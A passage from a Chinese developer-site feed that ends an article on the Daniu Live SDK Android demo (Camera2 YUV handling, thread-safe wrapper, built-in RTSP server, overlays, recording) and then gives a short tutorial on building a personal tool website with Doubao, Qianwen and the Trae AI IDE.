<h3 data-id="heading-2">关键点：YUV数据的获取与旋转</h3>
<p>在 <code>MainActivity</code> 中，实现了 <code>Camera2Listener</code> 接口。核心数据回调在 <code>onCameraImageData</code> 方法中：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Override</span>
public void onCameraImageData(Image image) {
    <span class="hljs-comment">// 校验格式是否为 YUV_420_888</span>
    if (image.getFormat() != ImageFormat<span class="hljs-selector-class">.YUV_420_888</span>) {
        return;
    }

    Image<span class="hljs-selector-class">.Plane</span><span class="hljs-selector-attr">[]</span> planes = image<span class="hljs-selector-class">.getPlanes</span>();
    <span class="hljs-comment">// 获取 Y, U, V 平面的 Buffer 及 Stride 信息</span>
    <span class="hljs-comment">// ... (省略部分裁剪代码)</span>

    <span class="hljs-comment">// 处理设备旋转角度</span>
    int rotation_degree = cameraImageRotationDegree_;
    if (rotation_degree &lt; <span class="hljs-number">0</span>) return;

    <span class="hljs-comment">// 将数据投递给 SDK</span>
    for (LibPublisherWrapper i : publisher_array_)
        <span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.PostLayerImageYUV420888ByteBuffer</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,
            planes[<span class="hljs-number">0</span>].getBuffer(), y_offset, planes<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.getRowStride</span>(),
            planes<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.getBuffer</span>(), u_offset, planes<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.getRowStride</span>(),
            planes<span class="hljs-selector-attr">[2]</span><span class="hljs-selector-class">.getBuffer</span>(), v_offset, planes<span class="hljs-selector-attr">[2]</span><span class="hljs-selector-class">.getRowStride</span>(), planes<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.getPixelStride</span>(),
            w, h, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,
            scale_w, scale_h, scale_filter_mode, rotation_degree);
}
</code></pre>
<p><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/></p>
<p><strong>技术解读：</strong></p>
<ul>
<li>
<p><strong>直接传递 ByteBuffer</strong>：代码直接将 <code>Image.Plane</code> 的 ByteBuffer 传递给 Native 层（<code>PostLayerImageYUV420888ByteBuffer</code>），避免了在 Java 层进行大量的数据拷贝，这是降低延迟和 CPU 占用的关键。</p>
</li>
<li>
<p><strong>处理 Stride</strong>：Camera2 输出的数据通常包含 Padding (Stride &gt; Width)，直接处理容易造成花屏。大牛直播SDK 提供了带 Stride 参数的接口，完美兼容了不同机型的 Camera2 输出。</p>
</li>
<li>
<p><strong>publisher_array_</strong>：这里设计了一个数组，包含 <code>stream_publisher_</code> 和 <code>snap_shot_publisher_</code>，意味着同一份 YUV 数据被同时用于推流/录像和快照处理。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fe69507b9464a4892358a8711cd0748~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z-z6KeG6aKR54mb5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765849562&amp;x-signature=1rW268TVjtvT5h5KNhInw7xbLnU%3D" alt="" loading="lazy"/></p>
<p>安卓轻量级RTSP服务采集摄像头，PC端到安卓拉取RTSP流</p>
<p><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/></p>
<h2 data-id="heading-3">3. 并发核心：LibPublisherWrapper 的设计</h2>
<p>为了保证多线程环境下的稳定性（UI线程操作开关，采集线程投递数据，编码线程处理数据），源码封装了 <code>LibPublisherWrapper</code> 类。它通过 <code>ReentrantReadWriteLock</code> 读写锁来保证 SDK 句柄的安全访问。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LibPublisherWrapper</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReadWriteLock</span> <span class="hljs-variable">rw_lock_</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>(<span class="hljs-literal">true</span>);
    <span class="hljs-comment">// ...</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">PostLayerImageYUV420888ByteBuffer</span><span class="hljs-params">(...)</span> {
        <span class="hljs-keyword">if</span> (!check_native_handle()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">if</span> (!read_lock_.tryLock()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 尝试获取读锁，避免阻塞采集线程</span>

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> OK == lib_publisher_.PostLayerImageYUV420888ByteBuffer(get(), ...);
        } <span class="hljs-keyword">finally</span> {
            read_lock_.unlock();
        }
    }
}
</code></pre>
<p><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/></p>
<p>这种 Wrapper 模式在音视频开发中非常推荐，能有效防止在 SDK 销毁过程中（如切换摄像头或关闭 Activity）因数据投递造成的 Crash。</p>
<h2 data-id="heading-4">4. 特色功能解析</h2>
<h3 data-id="heading-5">4.1 内置轻量级 RTSP 服务 (Lightweight RTSP Service)</h3>
<p>这是大牛直播SDK的一大特色。传统的推流端通常只负责推流，拉流需要依赖 Nginx 或 SRS 等服务器。但该 SDK 允许 Android 设备<strong>变身</strong>为 RTSP 服务器。</p>
<p>在 <code>MainActivity</code> 中：</p>
<pre><code class="hljs language-ini" lang="ini">// 初始化 RTSP Server 上下文
LibPublisherWrapper.RTSPServer.initialize_sdk(libPublisher, context_)<span class="hljs-comment">;</span>

// 启动服务
int <span class="hljs-attr">port</span> = <span class="hljs-number">8554</span><span class="hljs-comment">;</span>
LibPublisherWrapper.RTSPServer.Handle <span class="hljs-attr">server_handle</span> = 
    LibPublisherWrapper.RTSPServer.create_and_start_server(libPublisher, port, user_name, password)<span class="hljs-comment">;</span>
    
// 将 RTSP Server 关联到 Publisher
stream_publisher_.AddRtspStreamServer(rtsp_server_.get_native())<span class="hljs-comment">;</span>
</code></pre>
<p><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/></p>
<p><strong>应用场景：</strong></p>
<ul>
<li>
<p><strong>内网低延迟监控</strong>：同一个局域网内的 PC 或其他手机可以直接通过 <code>rtsp://device_ip:8554/stream1</code> 拉取低延迟流，无需经过云端 CDN，延迟可控制在毫秒级。</p>
</li>
<li>
<p><strong>教学/会议</strong>：讲师端作为 RTSP Server，学生端直接拉流。</p>
</li>
</ul>
<h3 data-id="heading-6">4.2 动态水印与图层叠加 (LayerPostThread)</h3>
<p>源码中包含一个 <code>LayerPostThread.java</code>，它展示了 SDK 强大的<strong>视频层叠加</strong>能力。</p>
<ul>
<li>
<p><strong>动态时间戳</strong>：通过 <code>makeTimestampString()</code> 生成当前时间 Bitmap。</p>
</li>
<li>
<p><strong>文字/图片水印</strong>：支持添加 Logo 或文字。</p>
</li>
<li>
<p><strong>矩形框绘制</strong>：演示了动态绘制 RGB 图层。</p>
</li>
</ul>
<p>这些图层并不是在 Java 层通过 Canvas 绘制到视频 Bitmap 上（那样效率太低），而是生成 Overlay 数据后，通过 <code>PostLayerBitmap</code> 或 <code>PostLayerImageRGBA8888ByteBuffer</code> 传递给底层，由 GPU 或 Native 高效混合。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// LayerPostThread.java 核心循环</span>
private void <span class="hljs-built_in">on_run</span>() {
    <span class="hljs-built_in">while</span>(!is_exit()) {
        <span class="hljs-comment">// 更新时间戳图层</span>
        <span class="hljs-built_in">post_timestamp_layer</span>(...);
        <span class="hljs-comment">// 更新文字图层</span>
        <span class="hljs-built_in">postText1Layer</span>(...);
        <span class="hljs-comment">// ...</span>
        <span class="hljs-built_in">sleep_ms</span>(update_interval);
    }
}
</code></pre>
<p><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/></p>
<h3 data-id="heading-7">4.3 实时录像与断网重连</h3>
<ul>
<li>
<p><strong>录像</strong>：<code>stream_publisher_.StartRecorder()</code> 即可开启本地录像。SDK 内部处理了音视频同步和 MP4 封装，且支持设置文件分片大小（<code>SetRecorderFileMaxSize</code>）。</p>
</li>
<li>
<p><strong>异常处理</strong>：<code>EventHandlerPublisherV2</code> 监听 SDK 回调。例如 <code>EVENT_DANIULIVE_ERC_PUBLISHER_DISCONNECTED</code> 事件触发时，应用层可以进行 UI 提示或自动重连逻辑。</p>
</li>
</ul>
<h2 data-id="heading-8">5. 性能优化总结</h2>
<p>通过分析这份代码，我们可以总结出几个关键的性能优化点：</p>
<ol>
<li>
<p><strong>零拷贝设计</strong>：Camera2 的 DirectByteBuffer 直接送入 Native，避免 Java Heap 内存抖动。</p>
</li>
<li>
<p><strong>硬编码优先</strong>：<code>initialize_publisher</code> 方法中优先尝试开启 H.264/H.265 硬编码 (<code>SetSmartPublisherVideoHWEncoder</code>)，大幅降低 CPU 占用。</p>
</li>
<li>
<p><strong>线程模型</strong>：采集、UI、数据投递、编码分发分离，利用读写锁保证线程安全且不阻塞高频的视频采集回调。</p>
</li>
</ol>
<h2 data-id="heading-9">结语：从“功能实现”到“工业级交付”的跨越</h2>
<p>纵观这份 Demo 源码，我们看到的不仅仅是一个功能的堆砌，而是一套<strong>经得起生产环境考验的 Android 音视频架构范本</strong>。它展示了大牛直播 SDK 如何在复杂的 Android 碎片化生态中，提供一种“确定性”的解决方案：</p>
<ol>
<li>
<p><strong>架构的鲁棒性设计</strong> 源码中 <code>LibPublisherWrapper</code> 的封装不仅仅是为了代码整洁，更体现了<strong>生命周期管理</strong>的智慧。通过引入 <code>ReentrantReadWriteLock</code>（读写锁）和 <code>WeakReference</code>（弱引用），这套架构巧妙地解决了音视频开发中最为棘手的“高并发数据竞争”与“对象引用泄漏”问题。它确保了在 Activity 销毁、摄像头切换或网络抖动等极端情况下，底层 Native 资源依然能被安全、有序地释放，这是从“Demo”走向“商用产品”的关键一步。</p>
</li>
<li>
<p><strong>“一次采集，多端分发”的效能极限</strong> 在移动端，算力和功耗是永远的痛点。本方案通过 <code>Camera2Helper</code> 实现了一次 YUV 数据采集，却能同时支撑 <strong>RTMP 远端直播</strong>、<strong>RTSP 局域网分发</strong> 以及 <strong>MP4 本地存证</strong> 三大业务流。这种“单源多汇”的 pipeline 设计，最大程度地复用了编码前的 YUV 数据和编码后的 H.264/H.265 数据，避免了重复的内存拷贝与色彩空间转换，将 CPU 和内存的开销压到了极致。</p>
</li>
<li>
<p><strong>从“推流端”到“边缘计算节点”的角色蜕变</strong> 最令人印象深刻的，是 SDK 内置的 <strong>轻量级 RTSP 服务</strong>。这一功能打破了传统推流端只能“单向上传”的刻板印象，让每一台 Android 设备都能瞬间变身为一台独立的 IP Camera 或流媒体服务器。这意味着在无公网、无云服务器的内网环境中（如车载监控、应急救援、无人机图传），该方案依然具备独立组网和视频分发的能力，为“边缘计算”和“物联网”场景提供了无限的想象空间。</p>
</li>
</ol>
<p>对于广大音视频开发者而言，不仅是一把打开 RTMP/RTSP 协议大门的钥匙，更是一份关于<strong>高性能、低延迟、高稳定性</strong>音视频应用开发的最佳实践指南。</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用 Trae Solo 快速搭建个人工具网站]]></title>    <link>https://juejin.cn/post/7581381365493661750</link>    <guid>https://juejin.cn/post/7581381365493661750</guid>    <pubDate>2025-12-09T02:38:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581381365493661750" data-draft-id="7581329603778035748" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用 Trae Solo 快速搭建个人工具网站"/> <meta itemprop="keywords" content="AI编程,Trae"/> <meta itemprop="datePublished" content="2025-12-09T02:38:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="haicoder_ibai"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615819799"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用 Trae Solo 快速搭建个人工具网站
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615819799/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    haicoder_ibai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:38:25.000Z" title="Tue Dec 09 2025 02:38:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>学长以前的系列文章中，</p>
<p>以前用 Python 写的 30+ 个小工具，</p>
<p>但是日常使用中十分不方便，</p>
<p>翻代码、配环境、手动跑，十分费劲，</p>
<p>很多时候都只能当“代码收藏家”——</p>
<p>学长每次想把Python小工具打包成网站，</p>
<p>纯后端出身的学长，一打开前端代码就头皮发麻：</p>
<p>“HTML不会写，CSS调不动，连个按钮都整不明白…”</p>
<p>理工男的审美也是不忍直视！</p>
<p>直到发现AI能当我的“前端翻译官”：</p>
<p>近期，学长运用豆包 + 千问 + Trae，</p>
<p>搭建出属于的学长工具库网站，</p>
<p>不用学前端，不用写代码，</p>
<p>直接把工具塞进网站，点开就用。</p>
<h2 data-id="heading-1">相关工具</h2>
<h3 data-id="heading-2">豆包</h3>
<blockquote>
<p>传送门：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.doubao.com%2F" target="_blank" title="https://www.doubao.com/" ref="nofollow noopener noreferrer">www.doubao.com/</a></p>
</blockquote>
<h3 data-id="heading-3">千问</h3>
<blockquote>
<p>传送门：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.qianwen.com%2F" target="_blank" title="https://www.qianwen.com/" ref="nofollow noopener noreferrer">www.qianwen.com/</a></p>
</blockquote>
<h3 data-id="heading-4">Trae</h3>
<blockquote>
<p>传送门：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.trae.cn%2F" target="_blank" title="https://www.trae.cn/" ref="nofollow noopener noreferrer">www.trae.cn/</a></p>
</blockquote>
<p>PS: 上诉工具是学长平时习惯使用，大家也可以使用自己熟悉的 AI 工具，比如：元宝、DeepSeek 等。</p>
<h2 data-id="heading-5">整体流程</h2>
<p>实现一个 “学长工具库” 步骤：</p>
<ul>
<li>根据需求描述，画出网站原型图</li>
<li>根据原型图，让 Trae 实现前端代码。</li>
<li>根据提示词，让 Trae 调整前端代码。</li>
</ul>
<h2 data-id="heading-6">原型图</h2>
<p>先使用豆包，生成网站原型图，如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93d195e30d5b4a78b14d597d91652e62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=CS4lkUw0JVssILK8OqxO%2B3IP96k%3D" alt="" loading="lazy"/></p>
<p>原型图生成，效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f4d73122eaa4f09bf8f8de5ce229640~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=Gfp38CxonAY7GF6m3iautuMiNJg%3D" alt="" loading="lazy"/></p>
<p>原型图详情页如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81be41223e454f84b487a6b2f0cb6cb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=aGkf2BKwPBN65Ziovgze1Y1OjbY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">需求文档</h2>
<p>通义千问梳理出需求文档，如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28bb0b77b1d44c5a99ab588aa5db05a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=q4rhiETSyV0WxV08bTUoX6aAh3A%3D" alt="" loading="lazy"/></p>
<p>生成的需求文档效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b55c9664ac04ad0b456d54c7f80d351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=uJNC5bImzfWkcZpRy%2FhmwqMW80k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">详细设计文档</h2>
<p>使用千问，根据上述需求文档，生成详细设计文档，如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52e657bbae4741ecb61c8702fa59c313~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=g3eN2WK3fYlql5aLahz1zo0%2BQ%2FQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">代码生成</h2>
<p>首先，我们打开 Trae 的 solo 模式，如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82f504607fa54427a6eeb1c15d4e19ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=clo8BDNBCWk6P%2BllXKjciO1zs0s%3D" alt="" loading="lazy"/></p>
<p>接下来，选中原型图，输入提示词，AI 会自主生成整个界面，如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7342715cb1094014a2d370efa780f30a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=weydJ94YEvJDaEvQr3s3UT5vgtQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">报错分析</h2>
<p>在生成完成后，可能会出现一些代码报错，</p>
<p>我们直接让 Trae 帮我们分析并解决即可，如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c1cc5034f3d4514b03a124d39c5bbb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=N3PftRPt7GDXy6ZCfjpUs3jTnwQ%3D" alt="" loading="lazy"/></p>
<p>解决上述语法错误之后，运行中报错以可以直接让 AI 分析</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46d4f2a233f24da8866d0c88afc120d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=MY0uYjsT9psknBSdxd22cT3FogE%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>AI 会给出错误分析以及修复步骤，并最终按照该步骤直接执行。</p>
</blockquote>
<h2 data-id="heading-11">网站运行</h2>
<p>待上述所有流程均解决后，可以运行项目，最终效果如下：</p>
<blockquote>
<p>PS：此效果比原型图少了许多工具，学长是为了方便提问 AI 以及修改，</p>
<p>因此只生成一个类型的工具，后续系列文章会慢慢完善。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0010a1742774453cb6c7433a26c93349~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=lqa0coOnk0DL2pVEkmK0EhnGXLk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e79a1d4699e7471ead76471470ed3dab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=T3lsRmVejzYJcqbydltiE6J0ksg%3D" alt="" loading="lazy"/></p>
<p>此时，学长觉得按钮描述需要调整，则可以随时找 AI 进行修改：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13408817fa7842ff9bb1d676951c6ac4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=BkQN3Y1gwgvk%2BUeRkfED69SX4WE%3D" alt="" loading="lazy"/></p>
<p>最终更改效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0e5fdde55294ecc8af1d604a2717190~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaGFpY29kZXJfaWJhaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765852704&amp;x-signature=Msy3wlfzqb1pni2cFUHC7%2FnqNRQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">结论</h2>
<p>通过本文的介绍，你学会了如何利用豆包、通义、Trae 快速开发一个工具网站（前端）。</p>
<h2 data-id="heading-13">历史文章系列</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FHZ62ZmvXPxIVY4mygI_F2Q" target="_blank" title="https://mp.weixin.qq.com/s/HZ62ZmvXPxIVY4mygI_F2Q" ref="nofollow noopener noreferrer">73.使用 Trae Solo 快速搭建个人工具网站</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkyODQ4MjA4Mg%3D%3D%26mid%3D2247486255%26idx%3D1%26sn%3D7e80c63fa39fe1841a52b6e855c977e0%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkyODQ4MjA4Mg==&amp;mid=2247486255&amp;idx=1&amp;sn=7e80c63fa39fe1841a52b6e855c977e0&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">71.30分钟用Trae搭建专属工具网站！零基础也能快速开发！</a></p>
